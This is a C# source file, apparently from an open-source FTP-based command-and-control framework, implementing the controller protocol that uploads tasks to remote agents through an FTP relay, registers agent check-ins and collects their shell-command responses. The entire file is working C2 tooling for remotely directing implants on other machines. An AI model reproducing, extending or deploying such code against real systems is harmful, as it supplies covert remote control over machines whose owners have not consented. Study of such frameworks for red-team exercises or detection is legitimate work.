/*
 * =========================================================================================
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpAgent;
using FtpC2.Responses;
using FtpC2.Tasks;
using System.Collections.Concurrent;
using System.Text.Json;

namespace FtpC2
{
    internal class C2Protocol : ProtocolBase 
    {
        public C2Protocol(string host, string username, string password, bool secure)
            : base(host, username, password, secure)
        { }

        public void RegisterNewTask(TaskWrapper task)
        {
            string jsonData = JsonSerializer.Serialize(task, task.GetType());

            string remoteFileName = PackRemoteFileName(
                Shared.PlaceHolders.TaskRequest,
                task.AgentId,
                task.Id, // For file randomness                
                PeerEncryptionHelper
            );

            UploadString(jsonData, remoteFileName);
        }

        public void RefreshAgents(ConcurrentDictionary<Guid /* AgentId */, Agent> agents)
        {
            List<string> files = ListDirectory();

            foreach (string file in files)
            {               
                var packedFileName = UnpackRemoteFileName(file);
                if (packedFileName == null)
                    continue; // Ignore

                if (packedFileName.Name != Shared.PlaceHolders.AgentInformation)
                    continue; // Ignore
                try
                {
                    if (!packedFileName.Session.HasValue)
                        throw new FormatException($"Session GUID expected but not found for file \"{file}\".");

                    if (!CanProcessFile(packedFileName.Signature, SelfEncryptionHelper))
                        continue; // Ignore

                    string jsonData = DownloadString(file);

                    Agent? agent = JsonSerializer.Deserialize<Agent>(jsonData);

                    if (agent != null && agent.Id == packedFileName.Session)
                        agents.AddOrUpdate(agent.Id, agent, (key, oldValue) => agent);
                    else
                        throw new FormatException("File is corrupted or invalid.");
                }
                catch
                {
                    //  In the event of a malformed agent, it is crucial to remove it
                    //  from the remote server. This preemptive action is necessary to prevent
                    //  a constant loop with each iteration, which would lead to unwarranted
                    //  resource consumption.
                    try
                    {
                        DeleteFile(file);
                    }
                    catch { }
                }                    
            }
        }
        
        public void EnumerateResponses(ConcurrentDictionary<Guid /* Agent */, ResponseWrapper> responses)
        {
            List<string> files = ListDirectory();

            foreach (string file in files)
            {
                var packedFileName = UnpackRemoteFileName(file);
                if (packedFileName == null)
                    continue; // Ignore

                if (packedFileName.Name != Shared.PlaceHolders.ResponseRequest)
                    continue; // Ignore          
                try
                {
                    if (!packedFileName.Session.HasValue)
                        throw new FormatException($"Session GUID expected but not found for file \"{file}\".");

                    if (!CanProcessFile(packedFileName.Signature, SelfEncryptionHelper))
                        continue; // Ignore                       

                    string jsonData = DownloadString(file);

                    ResponseWrapper? wrappedResponse = JsonSerializer.Deserialize<ResponseWrapper>(jsonData);
                    ResponseWrapper? response = null;

                    if (
                        wrappedResponse == null ||
                        wrappedResponse.TaskId != packedFileName.Uid ||
                        wrappedResponse.AgentId != packedFileName.Session
                    )
                        throw new FormatException("File is corrupted or invalid.");
                   
                    switch (wrappedResponse.ResponseType)
                    {
                        case "ResponseShellCommand":
                            {
                                response = JsonSerializer.Deserialize<ResponseShellCommand>(jsonData);                                 

                                break;
                            }

                        case "ResponseNotification":
                            {
                                response = JsonSerializer.Deserialize<ResponseNotification>(jsonData);

                                break;
                            }

                            // Add your additional response classes here
                            // ...
                    }

                    if (response != null) 
                    {
                        if (!responses.ContainsKey(packedFileName.Uid.Value))
                            responses.TryAdd(packedFileName.Uid.Value, response);
                    }                                              
                }
                catch
                {
                    //  In the event of a malformed task response, it is crucial to remove it
                    //  from the remote server. This preemptive action is necessary to prevent
                    //  a constant loop with each iteration, which would lead to unwarranted
                    //  resource consumption.
                    try
                    {
                        DeleteFile(file);
                    }
                    catch { }
                }
            }
        }
    }
}
